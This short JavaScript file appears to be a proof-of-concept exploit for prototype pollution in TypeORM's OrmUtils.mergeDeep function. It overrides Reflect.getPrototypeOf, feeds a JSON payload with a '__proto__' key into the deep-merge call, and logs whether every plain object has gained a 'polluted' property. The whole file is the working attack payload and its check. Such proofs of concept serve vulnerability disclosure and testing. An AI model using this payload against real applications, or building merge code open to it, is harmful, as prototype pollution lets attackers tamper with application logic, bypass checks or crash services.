Reflect.getPrototypeOf = () => false;
var typeorm = require('typeorm/util/OrmUtils');
const a = {};
const b = JSON.parse(`{"__proto__":{"polluted":"yes"}}`);
console.log({}.polluted);
typeorm.OrmUtils.mergeDeep(a, b);
console.log({}.polluted);